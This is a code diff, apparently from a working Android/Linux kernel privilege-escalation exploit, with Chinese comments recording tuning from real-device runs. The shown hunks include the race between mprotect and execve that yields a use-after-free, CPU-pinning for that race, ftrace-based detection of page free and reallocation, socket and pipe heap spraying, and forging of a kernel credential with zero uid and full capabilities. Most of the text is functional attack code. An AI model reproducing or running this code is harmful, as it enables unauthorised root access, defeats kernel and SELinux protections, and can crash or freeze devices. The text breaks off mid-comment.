-static unsigned trace_buf_kb(unsigned want)
-{
-	int ncpu = cpu_count();
-	unsigned kb = memguard_trace_buf_kb(g_mem_total_kb, ncpu, want);
-
-	if (kb != want)
-		dprintf(STDOUT_FILENO,
-			"[mem] trace buffer %u KB/cpu (want %u, memtotal %llu KB, cpus %d)\n",
-			kb, want, (unsigned long long)g_mem_total_kb, ncpu);
-	return kb;
-}
-
-static int write_trace_buf_kb(unsigned kb)
-{
-	char v[16];
-	int n = snprintf(v, sizeof(v), "%u\n", kb);
-
-	if (n <= 0 || (size_t)n >= sizeof(v))
-		return -1;
-	return write_file(TRACE "/buffer_size_kb", v);
-}
-
-/*
- * 把 trace 状态还原成「没动过」的样子：关 tracing、关事件、把环形缓冲缩回 7 KB。
- * 幂等：重复调用无害。
- */
-static void restore_trace_state(void)
-{
-	disarm();
-}
-
-/*
- * 信号路径只做 async-signal-safe 的最小还原：关 tracing、把环形缓冲缩回 7 KB。
- * 不能调 disarm()——它要写事件文件、还要 mmap，不是 async-signal-safe。
- * 还原完恢复默认处置并重新发信号，让退出码语义不变。
- */
-static void on_fatal_signal(int sig)
-{
-	int fd = open(TRACE "/tracing_on", O_WRONLY | O_CLOEXEC);
-
-	if (fd >= 0) {
-		(void)!write(fd, "0\n", 2);
-		close(fd);
-	}
-	fd = open(TRACE "/buffer_size_kb", O_WRONLY | O_CLOEXEC);
-	if (fd >= 0) {
-		(void)!write(fd, "7\n", 2);
-		close(fd);
-	}
-	signal(sig, SIG_DFL);
-	raise(sig);
 }
 
 static int g_socks[256][2];
@@ -1232,50 +490,6 @@ static int pin_cpu(int cpu)
 	CPU_ZERO(&set);
 	CPU_SET(cpu, &set);
 	return sched_setaffinity(0, sizeof(set), &set);
-}
-
-/*
- * 关键线程绑核。
- *
- * 为什么不绑 CPU 0：CPU 0 是 Android 主线程（UI/Compose）的地盘。注入期间用户
- * 点一下弹窗，主线程就在 CPU 0 上烧一阵子；而利用原语对时序极其敏感 ——
- * locker 线程的 mprotect 循环、killer 的 SIGKILL、exec 线程的 execve、父进程的
- * trace 采集与阶段交接，四者的相对时序决定内核 timer 拆解走哪条路。被抢一下，
- * 就可能从「良性 UAF」变成「内核 panic」。
- * 真机症状：注入弹窗上点一下，有一定概率卡死并把设备带崩。
- *
- * 父进程与 exec 线程**必须绑同一个核**：两者靠共享的 ipc->phase 互相交接，
- * 同核才能保持原有的先后关系（交接是 ping-pong，不是并行）。exec 线程与
- * locker/killer 线程仍然分属两个核（原来就是 CPU 0 与 CPU 1），相对关系不变。
- *
- * 核心数少的机器（<= 2）没有富余核，只能退回原来的绑法。
- */
-#define CRITICAL_CPU 2
-#define RACE_CPU 1
-
-/* 取一个可用的 CPU 编号：优先 preferred，核心不够时退回最后一个核。 */
-static int pick_cpu(int preferred, int ncpu)
-{
-	if (ncpu > preferred)
-		return preferred;
-	return ncpu > 1 ? ncpu - 1 : 0;
-}
-
-/* 关键核：父进程与 exec 线程共用。 */
-static int critical_cpu(void)
-{
-	return pick_cpu(CRITICAL_CPU, cpu_count());
-}
-
-/* 竞态核：race 子进程及其 locker/killer helper 用；与关键核不撞。 */
-static int race_cpu(void)
-{
-	int n = cpu_count();
-	int c = pick_cpu(RACE_CPU, n);
-	int k = critical_cpu();
-	if (c == k && n > 1)
-		c = (k == 0) ? 1 : 0;
-	return c;
 }
 
 /*
@@ -1439,22 +653,6 @@ static int collect_nth(int index, int *count, uint64_t *chosen)
 	g_all_n = s.out_n < s.out_cap ? s.out_n : s.out_cap;
 	dprintf(STDOUT_FILENO, "[uaf] captured=%d chosen=%#" PRIx64 " raw=%zu\n",
 		s.out_n, s.chosen, s.bytes);
-	/*
-	 * raw==0 与 raw>0 但 captured==0 是**两种完全不同的失败**，日志必须能区分：
-	 *   raw==0        → 环形缓冲里一条记录都没有 → kmem_cache_alloc 事件多半
-	 *                   没被 enable（rss_stat trigger 没触发）或没产生记录；
-	 *   raw>0 & captured==0 → 记录有，但 call_site / bytes_req 没匹配上。
-	 * 以前两者都只显示 captured=0，下一轮失败时完全无从判断。
-	 */
-	if (s.bytes == 0)
-		dprintf(STDOUT_FILENO,
-			"[uaf] raw buffer EMPTY — 事件多半没被 enable（rss_stat trigger "
-			"没触发），不是匹配问题\n");
-	else if (s.out_n == 0)
-		dprintf(STDOUT_FILENO,
-			"[uaf] 有 %zu 字节记录但没匹配上（call_site/bytes_req 不符）\n",
-			s.bytes);
-	log_sync();
 	*chosen = s.chosen;
 	return (s.out_n > index && s.chosen) ? 0 : -1;
 }
@@ -1493,25 +691,6 @@ static int spawn_helper(int (*fn)(void *), void *arg)
 	return pid;
 }
 
-/*
- * mprotect 风暴的节流（~1 ms）。
- *
- * 为什么必须节流：locker_fn 对 195 MB / 50000 个 VMA 的区间做 PROT_NONE<->PROT_READ
- * 翻转，mprotect 拿的是 mmap_lock **写锁**。满速循环时它会在两次调用之间立刻
- * 重新抢锁 —— 而 Linux 的 mmap_lock 写锁**不保证公平**，正在等锁的 execve
- * 可能被无限饿死：
- *   - execve 拆 mm 需要 mmap_lock 写锁 -> 抢不到 -> 利用进程卡死；
- *   - 而它**持有** mm 引用，整机所有要拿 mmap_lock 的路径一起卡住
- *     -> 整机冻结 -> 看门狗重启。
- * 这正是 run 8 的形状：「96 秒无任何输出、dropbox 全空、之后被看门狗重启」
- * （userspace 崩溃必然留 dropbox 条目，所以那次不是 Java 崩溃）。
- *
- * 命中率不受影响：execve 只要求「正好有一次 mprotect 在飞行中」，
- * 而拆一个 195 MB 的 mm 要几十毫秒 —— 1 ms 一次的节流几乎不损失命中概率，
- * 却把写锁占用率降下来，让等锁的 execve 真的能拿到锁。
- */
-#define LOCKER_MPROTECT_GAP_NS 1000000L
-
 static int locker_fn(void *arg)
 {
 	int prot = PROT_NONE;
@@ -1530,11 +709,6 @@ static int locker_fn(void *arg)
 		if (rc && atomic_exchange_explicit(&g_mprotect_reported, 1, memory_order_relaxed) == 0)
 			dprintf(STDOUT_FILENO, "[locker] mprotect errno=%d\n", errno);
 		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
-		{
-			struct timespec gap = { .tv_sec = 0,
-					       .tv_nsec = LOCKER_MPROTECT_GAP_NS };
-			nanosleep(&gap, NULL);
-		}
 	}
 	return 0;
 }
@@ -1574,7 +748,7 @@ static void *exec_fn(void *arg)
 	armed_event.sigev_signo = SIGRTMIN;
 	memset(&spec, 0, sizeof(spec));
 	spec.it_value.tv_sec = 3600;
-	if (pin_cpu(critical_cpu()))
+	if (pin_cpu(0))
 		_exit(116);
 	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 2) {
 		if (atomic_load_explicit(&g_stop, memory_order_acquire))
@@ -1626,7 +800,7 @@ static int child_race(void)
 	if (prepare_vmas())
 		_exit(110);
 	dprintf(STDOUT_FILENO, "[race_child] vmas ready pid=%d\n", getpid());
-	if (pin_cpu(race_cpu()))
+	if (pin_cpu(1))
 		_exit(115);
 	for (int i = 0; i < 3; i++) {
 		int pid = spawn_helper(locker_fn, NULL);
@@ -1755,122 +929,6 @@ int pc98260_run_rootd(void);
  */
 
 /*
- * 铺页窗口半径（字节）：收窄铺页后只在 node_off ±SPAN 内写 target。
- * 太小 → 对 node_off 漂移容错差、命中率降；太大 → 又回到整页散弹、脏 cred 风险回升。
- * 真机可据此回调，默认 0x200（约把脏地址足迹缩到 ~1/8）。
- */
-#define STREAM_TILE_SPAN 0x200u
-
-/* 铺页缓冲上限：最大写块 16 KiB（覆盖 4/8/16 KiB 三种块大小）。 */
-#define SPRAY_BUF_MAX 16384
-
-/* 喷洒原语之二：pipe 的页缓冲是 order-0 的页，字节 1:1 映射。 */
-#ifndef F_SETPIPE_SZ
-#define F_SETPIPE_SZ 1031
-#endif
-#define SPRAY_PIPES 4
-#define SPRAY_PIPE_SZ (1 << 20)
-
-static int g_pipe_w[SPRAY_PIPES];
-static int g_pipe_r[SPRAY_PIPES];
-static int g_npipe;
-
-/* 隔离（铺过的页不释放）最多保留几轮 —— 内存优先，别把设备拖垮。 */
-#define QUARANTINE_MAX_SETS 3
-static int g_quar_sets;
-
-static int open_pipe_spray(void)
-{
-	int i;
-
-	for (i = 0; i < SPRAY_PIPES; i++) {
-		int fds[2];
-
-		if (pipe(fds))
-			break;
-		fcntl(fds[0], F_SETFL, O_NONBLOCK);
-		fcntl(fds[1], F_SETFL, O_NONBLOCK);
-		/* 1 MiB = 256 页；超过 pipe-max-size 时忽略，默认 16 页也能喷 */
-		(void)fcntl(fds[1], F_SETPIPE_SZ, SPRAY_PIPE_SZ);
-		g_pipe_r[i] = fds[0];
-		g_pipe_w[i] = fds[1];
-		g_npipe++;
-	}
-	return g_npipe ? 0 : -1;
-}
-
-static void close_pipe_spray(void)
-{
-	int i;
-
-	for (i = 0; i < g_npipe; i++) {
-		if (g_pipe_w[i] >= 0)
-			close(g_pipe_w[i]);
-		if (g_pipe_r[i] >= 0)
-			close(g_pipe_r[i]);
-		g_pipe_w[i] = g_pipe_r[i] = -1;
-	}
-	g_npipe = 0;
-}
-
-/*
- * 在 [center-SPAN, center+SPAN) 窗口内以 24 字节步长铺 {0,0,target}。
- * 窗口之外保持 0 —— 铺得太宽会让被 cred slab 复用的页带上更多内核地址，
- * 也就更容易踩中「uid 槽读到内核地址 → 负 userId」那条路。
- */
-static void tile_pattern(unsigned char *pat, unsigned size, unsigned center,
-			 uint64_t target)
-{
-	unsigned align = center % 24u;
-	unsigned lo = center > STREAM_TILE_SPAN ? center - STREAM_TILE_SPAN : 0u;
-	unsigned hi = center + STREAM_TILE_SPAN;
-	unsigned off;
-
-	if (hi > size)
-		hi = size;
-	for (off = align; off + 24 <= size; off += 24) {
-		uint64_t *node;
-
-		if (off < lo || off >= hi)
-			continue;
-		node = (uint64_t *)(pat + off);
-		node[0] = 0;
-		node[1] = 0;
-		node[2] = target;
-	}
-}
-
-/*
- * 一次铺多个候选落点。
- *
- * 受害者对象在被释放页内的偏移是确定的（off_in_page），但「写块 → 页」的
- * 映射取决于内核怎么分块（8 KiB 写可能落成两个 4 KiB 页），同一个对象
- * 在页内因此有多个合法落点。v1 只赌一个（node_off & 0x1fff），赌错就是
- * 「命中了但伪造没落到位」。这里把四个候选都铺上：页内偏移本身、8 KiB
- * 窗口偏移、以及各自 +4 KiB 的另一半。
- */
-static void build_tile_buffers(unsigned char *pat, unsigned size,
-			       unsigned off_in_page, uint64_t target)
-{
-	unsigned c[4];
-	unsigned i;
-
-	c[0] = off_in_page & 0xfffu;
-	c[1] = off_in_page & 0x1fffu;
-	c[2] = 4096u + c[0];
-	c[3] = 4096u + c[1];
-	memset(pat, 0, size);
-	for (i = 0; i < 4; i++) {
-		if (c[i] + 24 > size)
-			continue;
-		tile_pattern(pat, size, c[i], target);
-	}
-	dprintf(STDOUT_FILENO,
-		"[reclaim] tile centers=[%u,%u,%u,%u] off_in_page=%#x size=%u\n",
-		c[0], c[1], c[2], c[3], off_in_page, size);
-}
-
-/*
  * R1：从 reclaim_stream 抽出的「构造 8KB 灌入模式」。
  *
  * 两种形态（由 g_plant_cred 决定）：
@@ -1878,21 +936,14 @@ static void build_tile_buffers(unsigned char *pat, unsigned size,
  *   g_plant_cred=0  以 24 字节步长铺 k_itimer 的 rb_node，让悬挂节点指向 target。
  * 返回 0 成功；-1 表示该页布局放不下（已打印原因）。
  */
-
-/* STREAM_TILE_SPAN 已提前到 v2 铺页辅助函数处定义。 */
-
 static int build_stream_pattern(unsigned char *pat, unsigned node_off,
 				uint64_t base, uint64_t target, uint64_t victim)
 {
 	if (g_plant_cred) {
 		uint64_t page = g_page_offset + (base << 12);
 		uint64_t node_kva = victim + KITIMER_NODE;
-		unsigned o0 = node_off & 0xfffu;
-		unsigned blob = o0 >= 0x40 ? 0 : 0x1f00;
-		uint64_t node_page = page + (node_off & ~0xfffu);
-		unsigned places[2];
-		int nplace = 0, p;
-
+		unsigned blob = node_off >= 0x40 ? 0 : 0x1f00;
+		uint64_t *cred;
 		if (node_off + CRED_PLANT_SIZE > 8192 || blob + 32 > 8192 ||
 		    page + node_off != node_kva) {
 			dprintf(STDOUT_FILENO, "[cred] plant does not fit off=%#x\n",
@@ -1903,80 +954,42 @@ static int build_stream_pattern(unsigned char *pat, unsigned node_off,
 			dprintf(STDOUT_FILENO, "[cred] blob overlaps node\n");
 			return -1;
 		}
-		/*
-		 * 两个落点都摆：
-		 *   places[0] = o0       —— 页内偏移本身（4 KiB / pipe 原语命中）
-		 *   places[1] = 4096+o0  —— 内核把写块映射到后一页时的落点
-		 *
-		 * 「写块 → 页」的映射取决于内核怎么分块（8 KiB 写可能落成两个
-		 * 4 KiB 页），同一个对象在页内因此有多个合法落点。老实现只赌一个
-		 * （node_off），赌错就是「页抢回来了、伪造却没落到位」。
-		 *
-		 * places[1] 只在 cred 能完整落在一个 4 KiB 页内时才摆
-		 * （o0 + CRED_PLANT_SIZE ≤ 4096），否则它会跨页、尾部被截断。
-		 */
-		places[nplace++] = o0;
-		if (o0 + CRED_PLANT_SIZE <= 4096u)
-			places[nplace++] = 4096u + o0;
-		for (p = 0; p < nplace; p++) {
-			unsigned at = places[p];
-			uint64_t *cred;
-
-			if (at + CRED_PLANT_SIZE > SPRAY_BUF_MAX)
-				continue;
-			cred = (uint64_t *)(pat + at);
-			if (CRED_UID_OFF >= 8) {
-				/* 6.6/6.12/6.18: usage 占 8 字节，uid@8，直接写这两个槽位 */
-				cred[0] = node_kva;                     /* usage（非 0 防止提前释放） */
-				cred[1] = 0;                            /* uid / gid */
-				/*
-				 * suid / sgid 也必须为 0（正规 root cred 的全部 uid* 都是 0）。
-				 * 历史实现把这里写成内核指针 g_task+TASK_CRED，指望后续
-				 * one_uaf(g_cred_kva+16) 定向补零覆盖掉它；但 ask_child 只校验
-				 * uid/euid，不校验 suid，一旦那两次补零 miss（最多重试 3 次且不
-				 * 判成败），suid/sgid 就残留成一个内核地址——按有符号读即负数，
-				 * 正是「偶尔提权后 uid 为负并导致重启」的根因。直接摆 0，补零
-				 * 只作冗余保险。
-				 */
-				cred[2] = 0;                            /* suid / sgid */
-			} else {
-				/*
-				 * 5.15/6.1: usage 只有 4 字节、uid@4；写 8 字节会把 uid 打成
-				 * node_kva 的高半部，16 处又是 sgid/euid —— 这两处都不能碰，
-				 * 只写 usage，uid..fsgid 保持 memset 的 0。
-				 */
-				*(uint32_t *)(pat + at) = (uint32_t)node_kva;
-			}
-			*(uint64_t *)(pat + at + CRED_OFF_CAP_INH)  = FULLCAP;
-			*(uint64_t *)(pat + at + CRED_OFF_CAP_PERM) = FULLCAP;
-			*(uint64_t *)(pat + at + CRED_OFF_CAP_EFF)  = FULLCAP;
-			*(uint64_t *)(pat + at + CRED_OFF_CAP_BSET) = FULLCAP;
-			*(uint64_t *)(pat + at + CRED_OFF_CAP_AMB)  = FULLCAP;
-			*(uint64_t *)(pat + at + CRED_OFF_SELINUX)  = node_page + blob;
-			*(uint64_t *)(pat + at + CRED_OFF_ROOT_USER)= slide_addr(LINK_ROOT_USER);
-			*(uint64_t *)(pat + at + CRED_OFF_USER_NS)  = slide_addr(LINK_USER_NS);
-			*(uint64_t *)(pat + at + CRED_OFF_UCOUNTS)  = slide_addr(LINK_UCOUNTS);
-			*(uint64_t *)(pat + at + CRED_OFF_GROUPS)   = slide_addr(LINK_GROUPS);
+		cred = (uint64_t *)(pat + node_off);
+		if (CRED_UID_OFF >= 8) {
+			/* 6.6/6.12/6.18: usage 占 8 字节，uid@8，直接写这三个槽位 */
+			cred[0] = node_kva;                     /* usage（非 0 防止提前释放） */
+			cred[1] = 0;                            /* uid / gid */
+			cred[2] = g_task + TASK_CRED;           /* suid / sgid（历史行为，保留） */
+		} else {
+			/*
+			 * 5.15/6.1: usage 只有 4 字节、uid@4；写 8 字节会把 uid 打成
+			 * node_kva 的高半部，16 处又是 sgid/euid —— 这两处都不能碰，
+			 * 只写 usage，uid..fsgid 保持 memset 的 0。
+			 */
+			*(uint32_t *)(pat + node_off) = (uint32_t)node_kva;
 		}
+		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_INH)  = FULLCAP;
+		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_PERM) = FULLCAP;
+		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_EFF)  = FULLCAP;
+		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_BSET) = FULLCAP;
+		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_AMB)  = FULLCAP;
+		*(uint64_t *)(pat + node_off + CRED_OFF_SELINUX)  = page + blob;
+		*(uint64_t *)(pat + node_off + CRED_OFF_ROOT_USER)= slide_addr(LINK_ROOT_USER);
+		*(uint64_t *)(pat + node_off + CRED_OFF_USER_NS)  = slide_addr(LINK_USER_NS);
+		*(uint64_t *)(pat + node_off + CRED_OFF_UCOUNTS)  = slide_addr(LINK_UCOUNTS);
+		*(uint64_t *)(pat + node_off + CRED_OFF_GROUPS)   = slide_addr(LINK_GROUPS);
 		dprintf(STDOUT_FILENO,
-			"[cred] node=%#" PRIx64 " task+cred=%#" PRIx64 " off=%#x o0=%#x places=%d\n",
-			node_kva, g_task + TASK_CRED, node_off, o0, nplace);
+			"[cred] node=%#" PRIx64 " task+cred=%#" PRIx64 " off=%#x\n",
+			node_kva, g_task + TASK_CRED, node_off);
 	} else {
-		/*
-		 * 铺页范围收窄（负数 uid 重启那条路）：悬挂 k_itimer 真正解引用的只有
-		 * node_off 附近那一个 rb_node（node[2]=rb_left=target 是关键的一跳）。
-		 * 历史实现把整页 8KB 每 24 字节都铺上 {0,0,target}，纯属冗余散弹；
-		 * 一旦这页被 free 后又被 cred_jar 复用，struct cred.uid（偏移 8）
-		 * 就可能落在某个 node[2] 槽上，继承一个内核地址 → system_server
-		 * 读到负 userId，陷入每分钟一次的崩溃循环（软重启清不掉）。
-		 *
-		 * 现在只在 node_off ±STREAM_TILE_SPAN 窗口内铺 target，窗口外一律保持
-		 * 0 —— 既保留对 node_off 轻微漂移的容错，也把脏地址足迹缩小约一个量级。
-		 * 同时铺四个候选落点（页内偏移 / 8 KiB 窗口偏移 / 各自 +4 KiB 的另
-		 * 一半），覆盖内核不同的写块分页方式，免得「页抢回来了、伪造却没落
-		 * 到位」。详见 tile_pattern() / build_tile_buffers()。
-		 */
-		build_tile_buffers(pat, 8192, node_off, target);
+		unsigned align = node_off % 24u;
+		for (unsigned off = align; off + 24 <= 8192; off += 24) {
+			uint64_t *node = (uint64_t *)(pat + off);
+			node[0] = 0;
+			node[1] = 0;
+			node[2] = target;
+		}
+		dprintf(STDOUT_FILENO, "[stream_backfill] tile align=%u off=%#x\n", align, node_off);
 	}
 	return 0;
 }
@@ -1998,277 +1011,77 @@ static int open_stream_pairs(int big)
 
 static int reclaim_stream(uint64_t victim, uint64_t target)
 {
-	uint64_t vnode = victim + KITIMER_NODE;
-	uint64_t cand = object_pfn(vnode);
-	uint64_t head = cand & ~UINT64_C(1);
+	uint64_t base = object_pfn(victim + KITIMER_NODE) & ~UINT64_C(1);
+	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0x1fff);
 	unsigned char *pat;
-	int hit = 0, writes = 0, ncpu, rcpu;
-	int order = -1;
-	uint64_t pf = 0;
-	int free_seen = 0;
-	int filter_ok = 1;
-	int uncertain = 0;
-	unsigned off_in_page = 0;
-	int risky;
+	int big = 16 << 20, hit = 0, writes = 0, ncpu;
 	struct timespec start, now;
-	static const unsigned chunk_tab[3] = { 8192, 4096, 16384 };
-
-	pat = mmap(NULL, SPRAY_BUF_MAX, PROT_READ | PROT_WRITE,
-		   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (node_off + 24 > 8192)
+		return -1;
+	pat = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 	if (pat == MAP_FAILED)
 		return -1;
-	memset(pat, 0, SPRAY_BUF_MAX);
-
-	/* --- 1. 事件 arm + 自检：没开火的话，后面全是假阴性 --- */
-	if (write_trace_buf_kb(trace_buf_kb(MEMGUARD_BUF_KB_RECLAIM))) {
-		munmap(pat, SPRAY_BUF_MAX);
+	memset(pat, 0, 8192);
+	/* R1：模式构造已抽出为 build_stream_pattern */
+	if (build_stream_pattern(pat, node_off, base, target, victim)) {
+		munmap(pat, 8192);
 		return -1;
 	}
-	if (trace_off_on() || kick_rss()) {
-		/* 环形缓冲已经被抬到高位，这里必须还原，否则它会一直占着。 */
-		restore_trace_state();
-		munmap(pat, SPRAY_BUF_MAX);
+	/* R1：socketpair 建立已抽出为 open_stream_pairs */
+	if (open_stream_pairs(big)) {
+		munmap(pat, 8192);
 		return -1;
 	}
-	/*
-	 * arm + 自检。组名运行期自发现（不同内核版本把 mm_page_* 放在不同的
-	 * 事件组里，写死 "kmem" 会让 enable/filter 写到不存在的路径上）。
-	 */
-	arm_page_events();
-	/*
-	 * 立刻把 ring 压小。
-	 *
-	 * mm_page_alloc 是热点事件：30 MB/核的 ring 转成文本能到上百 MB，全核
-	 * 扫一次 ~1 s —— 喷洒循环里每 32 写就要判一次，6 秒窗口根本跑不完。
-	 * 4 MB/核足够装下最近几秒的记录（受害者页的 free/alloc 就在这窗口里）。
-	 */
-	write_trace_buf_kb(4096);
-	/*
-	 * 复位上一轮留下的 pfn 过滤器：过滤器是事件级属性，不会随事件被
-	 * disable 而消失。不复位的话，本轮自检看到的 ring 里只有上一轮的
-	 * pfn 记录，会把「事件没开火」误判成「事件开着」。
-	 */
-	reset_page_filters();
-	if (probe_page_events()) {
-		g_page_events_live = 0;
-		dprintf(STDOUT_FILENO,
-			"[reclaim] WARN: mm_page_alloc/free 没 enable，命中判定不可信\n");
-	} else {
-		g_page_events_live = 1;
-	}
-
-	/* --- 2. pfn 过滤器：ring 里只留受害者页，扫描量与冲刷风险同时降下来 --- */
-	if (!g_page_group_alloc[0] || !g_page_group_free[0] ||
-	    set_pfn_filter(g_page_group_alloc, "mm_page_alloc", cand, head) ||
-	    set_pfn_filter(g_page_group_free, "mm_page_free", cand, head)) {
-		filter_ok = 0;
-		/*
-		 * 没有过滤器的退化路径：ring 里全是系统级的 mm_page_alloc
-		 * （热点事件），扫一次要几百毫秒。所以把 ring 缩到 4 MB/核：
-		 * 扫描量降到 1/8，代价是 ring 只留约一秒历史。
-		 * 真正的提速来自「只看释放者核」（判定量 1/8）。
-		 */
-		write_trace_buf_kb(4096);
-		dprintf(STDOUT_FILENO,
-			"[reclaim] pfn filter 不可用：ring 缩到 4 MB/核，扫描变慢但判定更密\n");
-	}
-
-	/* --- 3. 喷洒原语：socket（8/16 KiB 块）+ pipe（4 KiB 块，order-0 页） --- */
-	if (g_quar_sets >= QUARANTINE_MAX_SETS) {
-		/* 隔离轮数到上限：放掉最老的一轮，内存优先。 */
-		close_stream();
-		close_pipe_spray();
-		g_quar_sets--;
-	}
-	if (open_stream_pairs(4 << 20)) {
-		munmap(pat, SPRAY_BUF_MAX);
-		return -1;
-	}
-	open_pipe_spray();
 	ncpu = cpu_count();
-	rcpu = race_cpu();
-	dprintf(STDOUT_FILENO,
-		"[reclaim] pairs=%d pipes=%d cand=%#" PRIx64 " head=%#" PRIx64 "\n",
-		g_nstream, g_npipe, cand, head);
-
-	/* --- 4. 等受害者页被 free：拿内核报出来的真实 pfn 与 order --- */
+	dprintf(STDOUT_FILENO, "[stream_backfill] pairs=%d node_base=%#" PRIx64 " off=%#x\n",
+		g_nstream, base, node_off);
+	if (write_file(TRACE "/buffer_size_kb", "65536\n")) {
+		close_stream();
+		return -1;
+	}
+	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
+	trigger_cmd("enable_event:kmem:mm_page_free\n");
+	if (trace_off_on() || kick_rss()) {
+		close_stream();
+		return -1;
+	}
 	{
-		/*
-		 * 有过滤器：ring 里只有目标页的记录，扫描几毫秒 → 15 ms 轮询。
-		 * 无过滤器：mm_page_free 记录会被 mm_page_alloc 洪水冲掉，等也
-		 * 等不到（真机实测 free_seen 恒为 0），干等 3 s 纯属浪费 ——
-		 * 缩短到 ~0.6 s 后直接走 order-0 兜底。
-		 */
-		struct timespec pause = { .tv_nsec = (filter_ok ? 15 : 60) * 1000 * 1000 };
-		int waitn = filter_ok ? (g_fast ? 140 : 280) : (g_fast ? 10 : 20);
-
-		for (int i = 0; i < waitn && !free_seen; i++) {
+		struct timespec pause = { .tv_nsec = 200000000 };
+		int freed = 0;
+		int waitn = g_fast ? 12 : 40;
+		for (int i = 0; i < waitn && !freed; i++) {
 			nanosleep(&pause, NULL);
-			/*
-			 * 先只看释放者所在的核（文本量 1/8，判定快一个数量级），
-			 * 最后一轮再全核扫一次 —— 释放也可能发生在别的核上。
-			 */
-			if (trace_find_pfn_on_cpu("mm_page_free:", cand, &order, rcpu)) {
-				pf = cand;
-				free_seen = 1;
-			} else if (trace_find_pfn_on_cpu("mm_page_free:", head, &order, rcpu)) {
-				pf = head;
-				free_seen = 1;
-			} else if (i == waitn - 1) {
-				if (trace_find_pfn("mm_page_free:", cand, &order)) {
-					pf = cand;
-					free_seen = 1;
-				} else if (trace_find_pfn("mm_page_free:", head, &order)) {
-					pf = head;
-					free_seen = 1;
-				}
-			}
+			freed = trace_seen("mm_page_free:", base);
 		}
+		dprintf(STDOUT_FILENO, "[stream_backfill] page_freed=%d\n", freed);
 	}
-	if (!free_seen) {
-		/*
-		 * 没看到 free 记录：按最常见情形（order-0 单页）处理。
-		 * v1 在这里还会「page_freed=0 也照喷」，喷的是猜出来的 pfn ——
-		 * 受害者页根本没回 buddy，喷了也白喷，整轮 3.6 s 就这么没了。
-		 */
-		pf = cand;
-		order = 0;
-	}
-	off_in_page = (unsigned)(vnode - (g_page_offset + (pf << 12)));
-	dprintf(STDOUT_FILENO,
-		"[reclaim] victim pfn=%#" PRIx64 " free_seen=%d order=%d off_in_page=%#x\n",
-		pf, free_seen, order, off_in_page);
-
-	/* --- 5. 铺页模式 --- */
-	if (g_plant_cred) {
-		if (build_stream_pattern(pat, off_in_page, pf, target, victim)) {
-			munmap(pat, SPRAY_BUF_MAX);
-			return -1;
-		}
-	} else {
-		build_tile_buffers(pat, SPRAY_BUF_MAX, off_in_page, target);
-	}
-
-	/* --- 6. 喷洒 --- */
 	clock_gettime(CLOCK_MONOTONIC, &start);
-	for (int round = 0; round < 12 && !hit; round++) {
-		unsigned chunk = chunk_tab[round % 3];
-		int use_pipe, nfd, sends;
-
-		/*
-		 * cred 阶段也走完整的三种块大小（8K / 4K / 16K），**不再**钉死
-		 * 8 KiB。
-		 *
-		 * 老实现把块大小钉在 8 KiB，于是 use_pipe 恒为 0：pipe 那条
-		 * 「页缓冲就是 order-0 的页、字节 1:1 映射」的原语一次都没用上。
-		 * 而受害者页恰恰是 order-0 的单页 —— pipe 才是唯一能原样取回它
-		 * 的原语。现在伪造 cred 同时摆在页内偏移和 +4 KiB 两个位置
-		 * （build_stream_pattern），三种块大小都能命中正确的落点。
-		 */
-		use_pipe = (chunk == 4096 && g_npipe > 0);
-		nfd = use_pipe ? g_npipe : g_nstream;
-		sends = g_fast ? 200 : 80;
-		for (int i = 0, fd = 0; i < sends && !hit; i++) {
+	int rounds = g_fast ? 10 : 6;
+	for (int round = 0; round < rounds && !hit; round++) {
+		int sends = g_fast ? 200 : 80;
+		for (int i = 0, sock = 0; i < sends && !hit; i++) {
 			ssize_t n;
-
-			/*
-			 * 先打在释放者所在的核：刚 free 的页就在那个核的
-			 * per-CPU 空闲链里，别的核来取要走全局链，慢一拍。
-			 * 之后再轮转其它核，把 per-CPU 链都试一遍。
-			 */
-			pin_cpu(i < 64 ? rcpu : (i % ncpu));
-			if (use_pipe)
-				n = write(g_pipe_w[fd], pat, chunk);
-			else
-				n = write(g_stream[fd][0], pat, chunk);
-			if (n == (ssize_t)chunk) {
+			pin_cpu(i % ncpu);
+			n = write(g_stream[sock][0], pat, 8192);
+			if (n == 8192)
 				writes++;
-			} else if (++fd >= nfd) {
+			else if (++sock >= g_nstream)
 				break;
-			}
-			if ((i & 31) == 31) {
-				/*
-				 * 判定分两档：
-				 *   · 还钉在释放者核上（i < 64）——受害者页就在那个
-				 *     核的 per-CPU 空闲链里，只有那个核的分配能重新
-				 *     拿到它；只扫那一个核的 ring（文本量 1/8）。
-				 *   · 已经轮转到别的核 —— 扫全部核（每轮只做一次）。
-				 * 判定频率也从每 16 写降到每 32 写：写得太密只是
-				 * 反复读同一批 ring 文本，对命中率没帮助。
-				 */
-				if (i < 64)
-					hit = trace_find_pfn_on_cpu("mm_page_alloc:", cand,
-								  NULL, rcpu) ||
-					      trace_find_pfn_on_cpu("mm_page_alloc:", head,
-								  NULL, rcpu);
-				else
-					hit = trace_find_pfn("mm_page_alloc:", cand, NULL) ||
-					      trace_find_pfn("mm_page_alloc:", head, NULL);
-				if (hit)
-					break;
-			}
 		}
-		if (!hit)
-			hit = trace_find_pfn("mm_page_alloc:", cand, NULL) ||
-			      trace_find_pfn("mm_page_alloc:", head, NULL);
+		hit = trace_seen("mm_page_alloc:", base);
 		clock_gettime(CLOCK_MONOTONIC, &now);
-		if (now.tv_sec - start.tv_sec > 6)
+		if (now.tv_sec - start.tv_sec > 8)
 			break;
 	}
 	write_file(TRACE "/tracing_on", "0\n");
-	/*
-	 * 命中判定的三种结果：
-	 *   hit            —— 真看到目标页被重新分配（真阳性）；
-	 *   !hit && live   —— 事件开着、确实没看到（真阴性）：本轮白喷；
-	 *   !hit && !live  —— 事件没开火，**看不见**不等于**没有**。
-	 *
-	 * 第三种以前被当成「确定没命中」，直接判本轮失败 —— 真机日志里
-	 * 12/12 全是这样收场（writes=2389 hit=0），每轮白等 5.8 s，最后
-	 * 还只能报「未命中已知失败模式」。
-	 *
